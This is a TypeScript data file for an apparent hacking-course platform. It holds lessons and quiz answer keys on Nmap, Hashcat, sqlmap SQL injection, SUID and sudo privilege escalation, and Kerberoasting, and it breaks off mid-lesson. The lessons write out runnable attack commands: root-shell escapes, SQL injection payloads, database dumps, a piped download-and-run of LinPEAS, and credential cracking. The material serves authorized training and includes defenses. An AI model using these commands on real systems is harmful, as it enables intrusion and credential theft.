export interface QuizItem {
  question: string;
  options: string[];
  answer: number;
  explanation: string;
}

export interface Lesson {
  slug: string;
  title: string;
  module: string;
  part: number;
  partTitle: string;
  order: number;
  durationMinutes: number;
  video_url: string;
  lab_image: 'hackforge/dvwa' | 'hackforge/metasploitable2' | 'hackforge/juice-shop' | 'hackforge/kali-toolbox' | null;
  is_pro: boolean;
  content_md: string;
  quiz: QuizItem[];
}

export interface ModuleGroup {
  id: string;
  partNumber: number;
  partTitle: string;
  title: string;
  description: string;
  weeksSpan: string;
  is_pro: boolean;
  lessons: Lesson[];
}

export const HACKFORGE_CURRICULUM: Lesson[] = [
  // PART 1: FOUNDATIONS (FREE)
  {
    slug: "lab-setup-kali-parrot",
    title: "Setting Up Your Hacking Lab: Kali vs Parrot vs BlackArch",
    module: "Module 1: Lab Architecture",
    part: 1,
    partTitle: "Part 1: Foundations",
    order: 1,
    durationMinutes: 30,
    video_url: "https://www.youtube.com/watch?v=_iLm-m-sDn8",
    lab_image: "hackforge/metasploitable2",
    is_pro: false,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Offensive security requires absolute separation between your daily workstation and weaponized toolsets. Running raw exploit code, packet injectors, and reverse shells on your primary operating system invites accidental data leakage, network poisoning, and legal exposure. An isolated virtualization sandbox guarantees repeatability: when an outdated Python dependency breaks your environment, you can revert to a clean virtual machine snapshot in seconds.

## Theory
Offensive Linux distributions differ significantly in architecture, stability, and overhead:
- **Kali Linux (Debian Testing):** The industry benchmark maintained by Offensive Security. 95% of certification exams (OSCP, eJPT) utilize Kali. Memory footprint: ~1.2 GB idle with XFCE.
- **Parrot Security OS (Debian Stable):** Engineered for privacy and low resource usage. Ships preconfigured with Anonsurf (system-wide Tor proxying) and consumes ~650 MB idle.
- **BlackArch (Arch Linux):** Contains over 2,800 tools. High maintenance curve, best for experienced Arch users.

### Virtual Networking Models
- **Host-Only (vboxnet0):** Attacker and target VMs communicate across a private software switch. No packets escape to your local home/office Wi-Fi. **Mandatory for vulnerable target VMs.**
- **NAT / NAT Network:** Attacker VM accesses the internet for package installations while remaining reachable by target VMs on the internal subnet.
- **Bridged:** Attacker VM obtains an IP directly from your physical router. Dangerous for vulnerable VMs like Metasploitable.

## Tool Walkthrough with Real Runnable Commands

### 1. Verify CPU Hardware Virtualization
\`\`\`bash
egrep -c '(vmx|svm)' /proc/cpuinfo
\`\`\`
*Sample Output:*
\`\`\`text
8
\`\`\`
*(A count greater than 0 confirms Intel VT-x or AMD-V is enabled in BIOS/UEFI).*

### 2. Configure Host-Only Subnet & Locate Vulnerable Targets
\`\`\`bash
sudo fping -agq 192.168.56.0/24
\`\`\`
*Sample Output:*
\`\`\`text
192.168.56.1
192.168.56.101 (Kali Attacker)
192.168.56.102 (Metasploitable2 Target)
\`\`\`

### 3. Rapid Port Verification via Netcat
\`\`\`bash
nc -zv 192.168.56.102 21 22 80
\`\`\`
*Sample Output:*
\`\`\`text
Connection to 192.168.56.102 21 port [tcp/ftp] succeeded!
Connection to 192.168.56.102 22 port [tcp/ssh] succeeded!
Connection to 192.168.56.102 80 port [tcp/http] succeeded!
\`\`\`

## Step-by-Step Lab
1. Launch your sandbox terminal above.
2. Execute \`fping -agq 192.168.56.0/24\` to discover the live IP of the vulnerable target container.
3. Run \`nc -zv 192.168.56.102 21\` to verify FTP accessibility.
4. Take a virtual machine baseline snapshot labeled \`Baseline_Clean\`.

## Common Mistakes
- **Deploying Metasploitable in Bridged Adapter mode:** Exposes a severely vulnerable box with default root accounts to your entire physical local area network.
- **Forgetting Guest Additions:** Causes display resolution issues and disables shared clipboards between host and VM.
- **Running apt upgrade on Kali without taking a snapshot:** Bleeding-edge packages occasionally break Python virtualenvs.

## Defensive Perspective
From a Blue Team and SOC standpoint, scanning an isolated network segment leaves immediate telemetry in switch ARP tables and local firewall logs. Segmenting developer sandboxes into dedicated VLANs with zero route access to corporate active directory domains is mandatory under ISO 27001.

## Homework
1. Download and unpack \`/usr/share/wordlists/rockyou.txt.gz\` using \`sudo gzip -d\`.
2. Write a 5-line bash loop that pings a range of 10 IP addresses and echoes which are online.`,
    quiz: [
      {
        question: "Which virtualization network mode guarantees vulnerable targets cannot send traffic to the physical home network?",
        options: ["Bridged", "Host-Only", "NAT", "Promiscuous"],
        answer: 1,
        explanation: "Host-Only networking restricts communication strictly between the host and assigned virtual machines."
      },
      {
        question: "What is the primary risk of running Metasploitable 2 in Bridged adapter mode?",
        options: ["It consumes excessive RAM", "It exposes critical unpatched vulnerabilities to your entire physical local network", "It blocks SSH connections", "It wipes the host disk"],
        answer: 1,
        explanation: "Bridged adapter puts the vulnerable target directly onto your physical subnet with default credentials."
      },
      {
        question: "What does a return value greater than 0 from egrep -c '(vmx|svm)' /proc/cpuinfo signify?",
        options: ["Disk corruption", "Hardware virtualization is enabled in CPU", "The Linux kernel is 32-bit", "Root privileges are disabled"],
        answer: 1,
        explanation: "VMX (Intel) and SVM (AMD) CPU flags denote hardware-assisted virtualization support."
      },
      {
        question: "Which desktop environment is default on modern Kali Linux releases?",
        options: ["GNOME 40", "KDE Plasma", "XFCE", "MATE"],
        answer: 2,
        explanation: "Offensive Security chose XFCE as the default desktop due to its lightweight resource profile."
      },
      {
        question: "When should you take a Virtual Machine Snapshot?",
        options: ["Never", "Only after your disk is full", "Immediately after base setup and before executing untested exploits", "After running a DDoS tool"],
        answer: 2,
        explanation: "Snapshots enable instant recovery whenever tool installations or payload tests break operating system state."
      }
    ]
  },
  {
    slug: "linux-mastery-for-hackers",
    title: "Linux Mastery: SUID Permissions, Bash Scripting & Tmux",
    module: "Module 2: Linux Mastery",
    part: 1,
    partTitle: "Part 1: Foundations",
    order: 2,
    durationMinutes: 45,
    video_url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
    lab_image: "hackforge/metasploitable2",
    is_pro: false,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Over 80% of enterprise web servers and 95% of container workloads run on Linux. If you cannot navigate terminal permissions, manipulate file descriptors, and inspect SUID bits without a graphical interface, you will be unable to conduct professional penetration tests or escalate privileges post-exploitation.

## Theory
Linux permissions revolve around User, Group, and Others across Read (4), Write (2), and Execute (1). Special bits modify execution behavior:
- **SUID (Set User ID = 4000):** When an executable with SUID set is run, it executes with the permissions of the file owner (frequently root) rather than the calling user.
- **SGID (Set Group ID = 2000):** Executes with group permissions or enforces inherited group ownership on created subfiles.
- **Sticky Bit (1000):** Prevents non-owners from deleting files in world-writable shared directories like \`/tmp\`.

## Tool Walkthrough with Real Runnable Commands

### 1. Hunting SUID Binaries
\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`
*Sample Output:*
\`\`\`text
/usr/bin/sudo
/usr/bin/passwd
/tmp/rootbash
\`\`\`

### 2. Inspecting Cron Jobs for Insecure Automation
\`\`\`bash
cat /etc/crontab
ls -la /etc/cron.d/
\`\`\`

### 3. Persistent Shell Sessions with Tmux
\`\`\`bash
tmux new -s hackforge_session
# Detach: Ctrl+B then D
# Reattach:
tmux attach -t hackforge_session
\`\`\`

## Step-by-Step Lab
1. In your lab terminal, search for SUID binaries using \`find / -perm -4000 -type f 2>/dev/null\`.
2. Locate the \`/tmp/rootbash\` binary.
3. Execute \`/tmp/rootbash -p\` to maintain elevated effective UID.
4. Type \`id\` and confirm \`euid=0(root)\`.

## Common Mistakes
- Omitting \`2>/dev/null\` on find commands, flooding the terminal with permission denied errors.
- Forgetting \`-p\` when invoking SUID bash, causing bash to drop effective root privileges back to the standard user.

## Defensive Perspective
Audit all non-standard SUID binaries using tools like \`auditd\` and mount \`/tmp\` and \`/dev/shm\` with \`nosuid,noexec\` flags in \`/etc/fstab\`.

## Homework
1. Solve levels 0 through 10 on OverTheWire Bandit.
2. Write a bash one-liner that finds all world-writable files in \`/var/log\`.`,
    quiz: [
      {
        question: "What octal value represents the SUID permission bit?",
        options: ["1000", "2000", "4000", "7777"],
        answer: 2,
        explanation: "4000 represents SUID, 2000 represents SGID, and 1000 represents Sticky Bit."
      },
      {
        question: "Why must you pass '-p' when executing a SUID copy of /bin/bash?",
        options: ["To enable password mode", "To prevent bash from dropping effective root privileges", "To run in the background", "To encrypt process memory"],
        answer: 1,
        explanation: "Modern bash detects when UID != EUID and resets EUID to UID unless the -p (privileged) switch is specified."
      },
      {
        question: "Which directory is universally readable and writable on standard Linux systems, making it a prime location to drop exploit staging scripts?",
        options: ["/etc/security", "/root", "/tmp", "/boot"],
        answer: 2,
        explanation: "/tmp is world-writable (often with sticky bit) allowing unprivileged users to create temporary files."
      },
      {
        question: "In tmux, what is the default keyboard shortcut prefix?",
        options: ["Ctrl+A", "Ctrl+B", "Ctrl+C", "Alt+X"],
        answer: 1,
        explanation: "Ctrl+B is the default prefix for all tmux multiplexer shortcuts."
      },
      {
        question: "Which file contains the salted password hashes for local user accounts?",
        options: ["/etc/passwd", "/etc/hosts", "/etc/shadow", "/var/log/auth.log"],
        answer: 2,
        explanation: "/etc/shadow stores the cryptographic password hashes and is only readable by root."
      }
    ]
  },
  {
    slug: "networking-wireshark-tcpip",
    title: "Networking Fundamentals: The 3-Way Handshake & Wireshark Dissection",
    module: "Module 3: Networking Fundamentals",
    part: 1,
    partTitle: "Part 1: Foundations",
    order: 3,
    durationMinutes: 40,
    video_url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
    lab_image: "hackforge/metasploitable2",
    is_pro: false,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
You cannot exploit network traffic you do not understand. Ethical hackers dissect TCP sequence numbers, inspect unencrypted authentication frames in transit, and craft malformed packets to bypass packet filtering firewalls.

## Theory
The Transmission Control Protocol (TCP) establishes reliable connections via the 3-Way Handshake:
1. **Client -> Server: SYN (Synchronize)** - Initiates connection with random Sequence Number X.
2. **Server -> Client: SYN-ACK (Synchronize-Acknowledge)** - Server acknowledges with Ack Number X+1 and its own Sequence Number Y.
3. **Client -> Server: ACK (Acknowledge)** - Client confirms with Ack Number Y+1. Connection established.

Unencrypted legacy protocols (HTTP, FTP, Telnet) transmit credentials in cleartext across the local network segment, readable by anyone running a packet sniffer.

## Tool Walkthrough with Real Runnable Commands

### 1. Sniffing Credentials with TShark (Terminal Wireshark)
\`\`\`bash
sudo tshark -i eth0 -Y "ftp or http.request.method == 'POST'" -T fields -e ip.src -e ip.dst -e text
\`\`\`

### 2. Generating FTP Cleartext Authentication
\`\`\`bash
echo -e "USER msfadmin\\nPASS msfadmin\\nQUIT" | nc 192.168.56.102 21
\`\`\`
*Sample Output:*
\`\`\`text
220 (vsFTPd 2.3.4)
331 Please specify the password.
230 Login successful.
221 Goodbye.
\`\`\`

## Step-by-Step Lab
1. Launch the lab container.
2. Execute the Netcat command to transmit simulated FTP credentials.
3. Inspect the cleartext \`USER\` and \`PASS\` packets.

## Common Mistakes
- Misinterpreting display filters vs capture filters in Wireshark.
- Attempting to capture non-promiscuous traffic on switched physical networks without executing ARP spoofing.

## Defensive Perspective
Mandate encrypted transport (TLS 1.3, SSH, SFTP, IPsec) across all corporate communication and enforce 802.1X port authentication.

## Homework
1. Analyze a sample PCAP file containing a cleartext HTTP login form.
2. Write a Wireshark filter showing only packets with the TCP RST flag set.`,
    quiz: [
      {
        question: "What packets constitute the standard TCP 3-Way Handshake?",
        options: ["PING, PONG, ACK", "SYN, SYN-ACK, ACK", "REQ, ACK, FIN", "HELLO, ACCEPT, CONNECT"],
        answer: 1,
        explanation: "SYN initiates the connection, SYN-ACK responds with acknowledgment, and ACK finalizes establishment."
      },
      {
        question: "Which of the following protocols transmits authentication credentials in unencrypted plaintext by default?",
        options: ["SSH", "HTTPS", "FTP", "SFTP"],
        answer: 2,
        explanation: "FTP sends USER and PASS commands in cleartext over TCP port 21."
      },
      {
        question: "Which Wireshark display filter will isolate HTTP POST requests containing form logins?",
        options: ["ip.proto == 6", "http.request.method == \"POST\"", "tcp.port == 80", "dns.flags.response == 1"],
        answer: 1,
        explanation: "http.request.method == 'POST' specifically matches HTTP POST requests."
      },
      {
        question: "What TCP flag is sent by an attacker during an Nmap SYN scan to tear down the connection before full logging?",
        options: ["FIN", "RST", "URG", "PSH"],
        answer: 1,
        explanation: "An RST (Reset) packet immediately terminates the half-open connection."
      },
      {
        question: "What is the command-line counterpart of Wireshark commonly used on headless Linux servers?",
        options: ["Nmap", "TShark", "Burp Suite", "Hydra"],
        answer: 1,
        explanation: "TShark is the command-line network packet analyzer powered by Wireshark."
      }
    ]
  },
  {
    slug: "nmap-scanning-enumeration",
    title: "Nmap Deep Dive: Scanning Flags, NSE Scripts & Timing",
    module: "Module 7: Scanning & Enumeration",
    part: 2,
    partTitle: "Part 2: Core Hacking Skills",
    order: 7,
    durationMinutes: 50,
    video_url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
    lab_image: "hackforge/metasploitable2",
    is_pro: false,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Port scanning is the foundational bridge between passive intelligence gathering and active exploitation. If your scan misses a listening port, you miss the attack vector entirely. Elite penetration testers understand the precise TCP flags exchanged during SYN, ACK, and Connect scans to avoid tripping Intrusion Detection Systems (IDS) while gathering accurate service version banners.

## Theory
Nmap operates across multiple scan techniques:
- **SYN Stealth Scan (\`-sS\`):** Sends a TCP SYN. If the target returns SYN-ACK, Nmap immediately sends an RST to abort the handshake before the application socket creates an active connection log. Requires root privileges.
- **TCP Connect Scan (\`-sT\`):** Completes the full 3-Way Handshake via \`connect()\` system call. Leaves application logs but runs without root.
- **UDP Scan (\`-sU\`):** Essential for finding DNS (53), SNMP (161), and NTP (123). Slow because closed UDP ports return ICMP port unreachable.

### Timing Templates
- \`-T0\` (Paranoid) to \`-T1\` (Sneaky): Slow scans designed to bypass serial rate-limiting.
- \`-T4\` (Aggressive): Recommended for reliable local networks and lab environments.
- \`-T5\` (Insane): Sacrifices accuracy for extreme speed on high-bandwidth links.

## Tool Walkthrough with Real Runnable Commands

### 1. Comprehensive Service & Script Scan
\`\`\`bash
sudo nmap -sC -sV -p- -T4 -oA target_full 192.168.56.102
\`\`\`
*Sample Output:*
\`\`\`text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
\`\`\`

### 2. Targeting Specific Vulnerability Scripts (NSE)
\`\`\`bash
sudo nmap -p 21,80,445 --script vuln 192.168.56.102
\`\`\`

## Step-by-Step Lab
1. In your lab terminal, execute \`nmap -sC -sV 192.168.56.102\`.
2. Observe the open FTP port running vsftpd 2.3.4.
3. Execute \`nmap --script vuln -p 21 192.168.56.102\` to confirm CVE-2011-2523 vulnerability presence.

## Common Mistakes
- Forgetting \`-p-\` and only scanning the default top 1,000 ports, missing administrative ports on 8080 or 8443.
- Scanning external firewalled networks with \`-T5\`, causing packet drops and false negative results.

## Defensive Perspective
Configure network firewalls to drop unsolicited SYN packets silently, implement port knocking or IP whitelisting for management ports, and alert on rapid multi-port connection requests via Snort or Suricata.

## Homework
1. Write a custom bash script that parses Grepable Nmap output (\`.gnmap\`) to extract a clean comma-separated list of open ports.
2. Research the difference between \`-Pn\` (skip host discovery) and \`-sn\` (ping sweep only).`,
    quiz: [
      {
        question: "Why does an Nmap SYN Stealth Scan (-sS) send a TCP RST packet after receiving a SYN-ACK?",
        options: ["To crash the target server", "To tear down the connection before the application creates an active session log", "To download the web page", "To bypass DNS resolution"],
        answer: 1,
        explanation: "Sending an RST aborts the 3-way handshake, avoiding full connection establishment and standard application logging."
      },
      {
        question: "Which Nmap flag instructs the scanner to test all 65,535 TCP ports?",
        options: ["-p 1000", "-p-", "-A", "-sV"],
        answer: 1,
        explanation: "-p- is the shorthand equivalent to -p 1-65535."
      },
      {
        question: "What does the -sC flag do in an Nmap command?",
        options: ["Runs default Nmap Scripting Engine (NSE) scripts", "Encrypts the scan traffic with SSL", "Scans Cisco routers only", "Limits bandwidth to 100kbps"],
        answer: 0,
        explanation: "-sC is equivalent to --script=default, running safe enumeration and fingerprinting scripts."
      },
      {
        question: "Which output flag creates normal, XML, and grepable scan logs simultaneously?",
        options: ["-oN", "-oX", "-oA <basename>", "-oG"],
        answer: 2,
        explanation: "-oA outputs the results in all three primary formats."
      },
      {
        question: "When should you use the -Pn flag?",
        options: ["When the target blocks ICMP echo pings but has open TCP ports", "When scanning Bluetooth devices", "When you want to perform a UDP-only scan", "To scan without root permissions"],
        answer: 0,
        explanation: "-Pn treats all target hosts as alive, bypassing the ICMP host discovery probe."
      }
    ]
  },
  {
    slug: "password-attacks-hashcat",
    title: "Password Attacks: Hash Identification & GPU Cracking with Hashcat",
    module: "Module 10: Password Attacks",
    part: 2,
    partTitle: "Part 2: Core Hacking Skills",
    order: 10,
    durationMinutes: 45,
    video_url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
    lab_image: "hackforge/metasploitable2",
    is_pro: false,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Authentication credentials are the keys to the kingdom. Penetration testers rarely crack hashes using brute-force alone; they deploy targeted dictionary attacks augmented by probabilistic mutation rules.

## Theory
Hash functions are one-way cryptographic algorithms. Hashcat utilizes GPU parallelism (OpenCL/CUDA) to compute billions of guesses per second:
- **Mode 0:** MD5
- **Mode 1000:** NTLM (Windows Active Directory / SAM)
- **Mode 1800:** SHA-512 ($6$) Linux crypt
- **Mode 3200:** bcrypt
- **Mode 13100:** Kerberos 5 TGS-REP (Kerberoasting)

### Attack Modes (-a)
- \`-a 0\`: Straight / Dictionary
- \`-a 3\`: Mask Attack (custom charsets)

## Tool Walkthrough with Real Runnable Commands

### 1. Identifying an Unknown Hash
\`\`\`bash
hashid -m "cc32e74277b0709e99eb020bf23a4a06"
\`\`\`
*Sample Output:*
\`\`\`text
[+] MD5 [Hashcat Mode: 0]
[+] NTLM [Hashcat Mode: 1000]
\`\`\`

### 2. Cracking NTLM with Rockyou & Rules
\`\`\`bash
echo "cc32e74277b0709e99eb020bf23a4a06" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show
\`\`\`
*Sample Output:*
\`\`\`text
cc32e74277b0709e99eb020bf23a4a06:password123
\`\`\`

## Step-by-Step Lab
1. Launch the lab terminal.
2. Crack the provided NTLM hash with Hashcat mode 1000.
3. Observe how rule mutation expands the dictionary without extra disk storage.

## Common Mistakes
- Running online brute-forcing (Hydra) against enterprise directories without checking account lockout thresholds.
- Not specifying \`--show\` when reviewing previously cracked hashes in the Hashcat potfile.

## Defensive Perspective
Enforce multi-factor authentication (FIDO2 WebAuthn), implement strong Argon2id or bcrypt hashing with high cost factors, and prohibit compromised passwords using HaveIBeenPwned API lookups.

## Homework
1. Generate an NTLM hash for a custom password using Python and crack it using a custom Hashcat mask.`,
    quiz: [
      {
        question: "Which Hashcat mode (-m) is used for Windows NTLM hashes?",
        options: ["0", "100", "1000", "1800"],
        answer: 2,
        explanation: "Mode 1000 corresponds to NTLM."
      },
      {
        question: "What does the -a 0 flag specify in Hashcat?",
        options: ["Mask attack", "Dictionary / Straight attack", "Hybrid attack", "Combinator attack"],
        answer: 1,
        explanation: "Attack mode 0 is the Straight/Dictionary attack."
      },
      {
        question: "What is the function of a mutation rule file (such as best64.rule) in Hashcat?",
        options: ["It reboots the GPU", "It applies algorithmic mutations (capitalization, leet-speak, appending numbers) to dictionary words", "It encrypts the output", "It bypasses Windows Defender"],
        answer: 1,
        explanation: "Rules dynamically mutate words from the dictionary to match common human password patterns."
      },
      {
        question: "Where does Hashcat store cracked hashes by default?",
        options: ["/etc/shadow", "hashcat.potfile", "/tmp/passwords.txt", "/var/log/syslog"],
        answer: 1,
        explanation: "Hashcat records all recovered plaintexts in its potfile to prevent re-cracking."
      },
      {
        question: "Why is bcrypt significantly more resistant to GPU cracking than MD5 or NTLM?",
        options: ["It requires a USB key", "It uses an adjustable cost parameter that intentionally consumes significant memory and CPU cycles", "It is only used on Mac OS", "It cannot be hashed on Linux"],
        answer: 1,
        explanation: "bcrypt is an adaptive, slow hashing algorithm designed specifically to thwart hardware-accelerated cracking."
      }
    ]
  },
  {
    slug: "web-hacking-sqli",
    title: "Web Hacking: SQL Injection & Automated Exploitation with sqlmap",
    module: "Module 11: Web Application Hacking",
    part: 2,
    partTitle: "Part 2: Core Hacking Skills",
    order: 11,
    durationMinutes: 60,
    video_url: "https://portswigger.net/web-security",
    lab_image: "hackforge/dvwa",
    is_pro: false,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
SQL Injection (SQLi) remains one of the highest-impact vulnerability classes. A single unsanitized database query can allow an unauthenticated remote attacker to bypass login forms, dump customer database tables, or write web shells directly to the host filesystem.

## Theory
SQL Injection occurs when user-supplied input is directly concatenated into a dynamic SQL query string instead of being treated as isolated parameter values.
- **In-Band / UNION:** Appends results from an attacker query to application output.
- **Error-Based:** Induces database errors revealing schema data.
- **Blind (Boolean / Time-based):** Infers database values byte-by-byte based on conditional true/false or server delay.

## Tool Walkthrough with Real Runnable Commands

### 1. Manual Auth Bypass Payload
\`\`\`sql
' OR 1=1 -- -
admin' --
\`\`\`

### 2. Automated SQLi Testing with sqlmap
\`\`\`bash
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID=session_here" \\
  --batch \\
  --dbs
\`\`\`
*Sample Output:*
\`\`\`text
[+] available databases [2]:
[*] dvwa
[*] information_schema
\`\`\`

### 3. Dumping Tables and Hashes
\`\`\`bash
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID=session_here" \\
  -D dvwa -T users --dump
\`\`\`

## Step-by-Step Lab
1. Open your lab terminal.
2. Verify the DVWA web server response on \`http://192.168.56.102\`.
3. Run the automated sqlmap command against the \`/dvwa/vulnerabilities/sqli/\` endpoint.
4. Dump the \`users\` table and extract the admin MD5 hash.

## Common Mistakes
- Forgetting to pass the authenticated session cookie (\`--cookie\`), causing sqlmap to test the public login redirect instead of the vulnerable endpoint.

## Defensive Perspective
The single infallible defense against SQL Injection is **Parameterized Queries (Prepared Statements)**.

## Homework
1. Complete the PortSwigger Web Security Academy SQL Injection Apprentice labs.`,
    quiz: [
      {
        question: "What is the definitive defense against SQL Injection?",
        options: ["Regex blacklisting", "Parameterized Queries (Prepared Statements)", "Moving the database to port 3307", "Encoding passwords with base64"],
        answer: 1,
        explanation: "Parameterized queries ensure the SQL interpreter treats input as data, never code."
      },
      {
        question: "Which sqlmap switch automatically accepts default answers in non-interactive mode?",
        options: ["--force", "--batch", "--quiet", "--yes"],
        answer: 1,
        explanation: "--batch runs without asking interactive questions."
      },
      {
        question: "What does UNION SELECT require regarding the queries being combined?",
        options: ["They must target different servers", "They must return the same number and compatible data types of columns", "They must use SSL", "They must be executed by root"],
        answer: 1,
        explanation: "UNION requires matching column counts and compatible types."
      },
      {
        question: "What SQL comment syntax works reliably across MySQL, PostgreSQL, and SQLite?",
        options: ["//", "/* */", "-- -", "REM"],
        answer: 2,
        explanation: "-- - (dash dash space) is standard SQL comment syntax."
      },
      {
        question: "In Time-Based Blind SQL injection, what function is commonly injected in PostgreSQL?",
        options: ["sleep()", "pg_sleep()", "WAITFOR DELAY", "benchmark()"],
        answer: 1,
        explanation: "pg_sleep() is PostgreSQL's built-in sleep function."
      }
    ]
  },

  // PART 3: ADVANCED OFFENSIVE SECURITY (PRO GATED)
  {
    slug: "linux-privilege-escalation-gtfobins",
    title: "Linux Privilege Escalation: GTFOBins, Sudo Misconfigs & LinPEAS",
    module: "Module 15: Privilege Escalation",
    part: 3,
    partTitle: "Part 3: Advanced Offensive Security",
    order: 15,
    durationMinutes: 55,
    video_url: "https://gtfobins.github.io",
    lab_image: "hackforge/metasploitable2",
    is_pro: true,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Landing an initial unprivileged web shell (e.g. \`www-data\`) is only the entry ticket. To dump enterprise credentials, access raw disks, or pivot across subnets, you must escalate to \`root\`. Misconfigured sudo rights and SUID binaries frequently provide instant root takeover without writing kernel exploits.

## Theory
System administrators often grant unprivileged accounts specific sudo commands to perform maintenance without giving full root access. However, dozens of standard Unix utilities contain interactive shell escapes or arbitrary file read/write primitives cataloged on **GTFOBins** (https://gtfobins.github.io):
- \`sudo find\`: \`sudo find . -exec /bin/sh \\; -quit\`
- \`sudo vim\`: \`sudo vim -c ':!/bin/sh'\`
- \`sudo awk\`: \`sudo awk 'BEGIN {system("/bin/sh")}'\`

## Tool Walkthrough with Real Runnable Commands

### 1. Enumerating Sudo Privileges
\`\`\`bash
sudo -l
\`\`\`
*Sample Output:*
\`\`\`text
User www-data may run the following commands on target:
    (root) NOPASSWD: /usr/bin/find
\`\`\`

### 2. Instant Escalation via GTFOBins
\`\`\`bash
sudo /usr/bin/find . -exec /bin/sh \\; -quit
whoami
\`\`\`
*Sample Output:*
\`\`\`text
root
\`\`\`

### 3. Automated Enumeration with LinPEAS
\`\`\`bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
\`\`\`

## Step-by-Step Lab
1. In your lab terminal, run \`sudo -l\` as user kali.
2. Identify which binaries have NOPASSWD permissions.
3. Consult GTFOBins to spawn an elevated root shell.

## Common Mistakes
- Compiling dirty kernel exploits (e.g. Dirty COW) on production targets before exhausting simple configuration missteps. Kernel exploits risk crashing production hosts.

## Defensive Perspective
Implement strict \`sudoers\` least-privilege principles, disable \`NOPASSWD\`, and deploy endpoint detection (auditd/Falco) to flag interactive shells spawned by web daemons.

## Homework
1. Practice 5 different GTFOBins escalation techniques on Hack The Box starting machines.`,
    quiz: [
      {
        question: "What is the primary resource for finding shell escapes in standard Unix binaries with sudo or SUID permissions?",
        options: ["Wikipedia", "GTFOBins", "GitHub Trending", "Stack Overflow"],
        answer: 1,
        explanation: "GTFOBins is the curated catalog of Unix binaries that can be exploited to bypass local security restrictions."
      },
      {
        question: "What is the first command you should execute upon gaining a Linux shell to check for privilege escalation vectors?",
        options: ["reboot", "sudo -l", "rm -rf /", "nmap 127.0.0.1"],
        answer: 1,
        explanation: "sudo -l displays the permitted commands and sudo rules assigned to the current user."
      },
      {
        question: "Why should kernel exploits be treated as a last resort during professional penetration tests?",
        options: ["They are illegal in all countries", "Kernel exploits can trigger kernel panics (BSOD/Kernel crash), disrupting client production services", "They require Windows 11", "They only work on laptops"],
        answer: 1,
        explanation: "Kernel exploits destabilize memory and frequently cause kernel panics and unexpected downtime."
      },
      {
        question: "In LinPEAS, what color combination indicates a 99% probability of a successful privilege escalation vector?",
        options: ["Blue text on white", "Red text on yellow background", "Green text on black", "Grey text"],
        answer: 1,
        explanation: "LinPEAS reserves red text on yellow background for high-confidence privilege escalation vectors."
      },
      {
        question: "How can a system administrator safely configure sudoers to avoid shell escapes in text editors?",
        options: ["Use sudoedit instead of allowing sudo vim directly", "Delete the vim binary", "Disable passwords for all users", "Run all servers as root"],
        answer: 0,
        explanation: "sudoedit allows users to edit files securely without granting shell escape capabilities."
      }
    ]
  },
  {
    slug: "active-directory-kerberoasting",
    title: "Active Directory Attacks: Kerberoasting & BloodHound",
    module: "Module 17: Active Directory Attacks",
    part: 3,
    partTitle: "Part 3: Advanced Offensive Security",
    order: 17,
    durationMinutes: 70,
    video_url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
    lab_image: "hackforge/metasploitable2",
    is_pro: true,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Microsoft Active Directory governs identity and authentication in over 90% of Fortune 500 enterprise environments. Attackers who gain an initial unprivileged foothold on an internal workstation rarely exploit zero-days to reach Domain Admin; instead, they abuse built-in Kerberos architecture flaws like **Kerberoasting** and **AS-REP Roasting** to crack service account credentials and compromise domain controllers.

## Theory
Kerberos authentication relies on tickets issued by the Key Distribution Center (KDC):
1. **TGT (Ticket Granting Ticket):** Issued during initial logon.
2. **TGS (Ticket Granting Service):** Requested by a domain user when they need to authenticate to a registered service (e.g. MSSQLSvc/sql01.corp.local).

### The Flaw Behind Kerberoasting
By Active Directory design, **any authenticated domain user** can request a TGS ticket for any Service Principal Name (SPN) registered in the domain. The KDC encrypts this ticket using the **NTLM hash of the service account**. The requesting user extracts this ticket from memory, exports the hash, and cracks it offline using high-performance GPU rigs without triggering account lockouts on the domain controller.

## Tool Walkthrough with Real Runnable Commands

### 1. Requesting SPN Tickets via Impacket
\`\`\`bash
GetUserSPNs.py corp.local/john.doe:Password123 \\
  -dc-ip 192.168.56.102 \\
  -request \\
  -outputfile kerberoast_hashes.txt
\`\`\`
*Sample Output:*
\`\`\`text
[*] Requesting SPN: MSSQLSvc/sql01.corp.local:1433
[+] Outputting hash format $krb5tgs$23$* into kerberoast_hashes.txt
\`\`\`

### 2. Cracking Tickets with Hashcat Mode 13100
\`\`\`bash
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
\`\`\`
*Sample Output:*
\`\`\`text
$krb5tgs$23$...:Summer2026!
\`\`\`

### 3. Collecting Domain Graph Data with BloodHound
\`\`\`bash
bloodhound-python -u 'john.doe' -p 'Summer2026!' \\
  -d corp.local -ns 192.168.56.102 -c All
\`\`\`

## Step-by-Step Lab
1. In your lab terminal, launch \`GetUserSPNs.py\` against the simulated domain controller.
